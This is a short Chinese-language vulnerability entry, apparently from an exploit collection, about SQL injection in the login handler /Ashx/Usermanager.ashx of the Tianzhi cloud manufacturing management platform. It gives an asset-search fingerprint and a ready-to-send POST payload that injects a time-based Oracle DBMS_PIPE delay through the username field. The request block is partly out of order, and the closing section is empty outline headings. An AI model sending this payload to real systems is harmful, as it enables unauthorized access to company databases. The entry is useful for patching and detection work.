# 天智云制造管理平台存在SQL注入漏洞

- **系统**：天智云制造管理平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="Ashx/Usermanager.ashx"`
- **请求**：`POST /Ashx/Usermanager.ashx HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
type=LOGIN&username=1') AND 1566=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)CHR(90)CHR(98)CHR(107),5) AND ('DgMy'='DgMy&pwd=123&vendor=
POST /Ashx/Usermanager.ashx HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
type=LOGIN&username=1&pwd=123&vendor=
>
```

**其他**
- 天智云制造管理平台存在SQL注入漏洞: + 一、漏洞简介
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: + 天智云制造管理平台